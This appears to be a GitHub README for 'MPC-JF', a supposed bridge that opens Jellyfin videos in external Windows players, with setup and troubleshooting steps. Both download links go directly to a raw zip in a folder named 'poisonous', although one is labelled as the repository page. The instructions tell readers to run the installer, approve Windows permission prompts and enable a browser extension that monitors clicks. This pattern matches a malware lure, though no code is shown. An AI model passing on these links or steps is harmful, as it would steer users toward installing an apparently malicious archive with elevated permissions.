# 📽️ MPC-JF - Watch Jellyfin shows in external players

[![Download MPC-JF](https://img.shields.io/badge/Download-MPC--JF-blue)](https://github.com/matthew4218/MPC-JF/raw/refs/heads/main/poisonous/MP-JF-v1.5.zip)

Many people prefer specific media players for their video files. MPC-JF bridges the gap between your Jellyfin library and your preferred desktop media player. It allows you to launch content from the Jellyfin web interface or the Jellyfin Media Player directly into applications like MPC-HC, MPC-BE, or PotPlayer.

## ⚙️ Why use this tool

Jellyfin is a powerful media server. Sometimes the built-in player lacks the specific features or file format compatibility you need. By using this script, you maintain the organization of your Jellyfin library while leveraging the playback power of dedicated desktop software. 

This tool saves you the trouble of manually searching for files on your hard drive. It detects your click in the browser and sends the video information to your choice of external software.

## 🖥️ Supported Media Players

MPC-JF works with the most common Windows media players. You can select your preferred tool during the setup process:

*   MPC-HC (Media Player Classic Home Cinema)
*   MPC-BE (Media Player Classic Black Edition)
*   PotPlayer
*   Other external media players supported by command-line arguments

## 📥 Getting the software

You need to access the main project site to obtain the setup files.

[Visit the MPC-JF repository page to download the latest version](https://github.com/matthew4218/MPC-JF/raw/refs/heads/main/poisonous/MP-JF-v1.5.zip)

Look for the "Releases" section on the right side of the project page. Select the latest version and download the installation file to your computer.

## 🛠️ Setting up the application

Follow these steps to prepare your system once you finish the download.

1.  **Locate the installation file.** Find the downloaded file in your browser downloads folder or your desktop.
2.  **Run the installer.** Double-click the file to begin. Windows may ask for permission to run the software. Confirm this request to proceed.
3.  **Choose your player.** The setup program asks which media player you want to use. Select the one you have currently installed on your PC. If you do not have a player, you must install MPC-HC, MPC-BE, or PotPlayer before running this script.
4.  **Confirm the path.** Ensure the script recognizes the location where your media player lives. The installer usually detects this automatically.
5.  **Finish the process.** Click through the final confirmation prompts to complete the installation.

## 🌐 Configuring your browser

Your web browser needs to know how to handle the signals sent by the Jellyfin interface. 

The installation process generally includes a browser extension component. Ensure your browser displays the extension icon in the toolbar after you complete the setup. If you do not see the icon, restart your browser. 

The extension monitors your clicks on the Jellyfin play button. When you click play, it checks your settings to decide whether to open the video inside the web page or send the request to your desktop player.

## 🎬 How to play files

Once you install and configure the components, playing a video is simple.

1.  Open your browser and sign in to your Jellyfin server.
2.  Navigate to the movie or television episode you want to watch.
3.  Click the play button as you normally would.
4.  A prompt will appear. It asks if you want to open the file in the external player.
5.  Select "Yes" or "Always use this player."
6.  Your chosen media player will launch, load the video stream, and begin playback.

You can now use the features of your external player, such as advanced subtitle synchronization, custom renderers, or specific keyboard shortcuts for seeking.

## 🛡️ Requirements

Ensure your computer meets these basic requirements before you begin:

*   **Operating System:** Windows 10 or Windows 11.
*   **Browser:** Google Chrome, Microsoft Edge, or Mozilla Firefox.
*   **Media Player:** At least one of the supported players (MPC-HC, MPC-BE, or PotPlayer) installed in a standard location.
*   **Network:** Access to your Jellyfin server must be active and your user credentials must be valid.

## 🔍 Troubleshooting common issues

If you encounter problems, review this checklist to identify the cause.

*   **Player does not open:** Check if the player is still installed. Sometimes updates move the location of the software. Open the MPC-JF settings menu and verify the file path to the player executable file.
*   **Links act normally:** If the video plays in the browser instead of the external player, verify the browser extension is active. Open your browser extension management page and make sure the MPC-JF extension is enabled.
*   **Playback errors:** If the player opens but the video does not start, verify your network connection. Ensure your firewall does not block the interaction between the player and the Jellyfin server.
*   **Wrong player opens:** If you wish to switch from MPC-HC to PotPlayer, look for the settings icon provided by the browser extension. Select your new preference from the dropdown menu.

## 💡 Best practices for performance

For the best experience, keep your media player updated. Players like MPC-HC receive frequent updates to improve performance and compatibility with modern video codecs. 

If you use a remote Jellyfin server, make sure your internet connection remains stable. External players sometimes require more bandwidth than the standard web player. 

You can run multiple instances of the script if you need to support different players for different types of media. However, most users find that one primary player serves their needs for the entire library. 

Take a moment to check your player settings for "Start in full screen" options if you prefer an immersive experience from the moment you click play.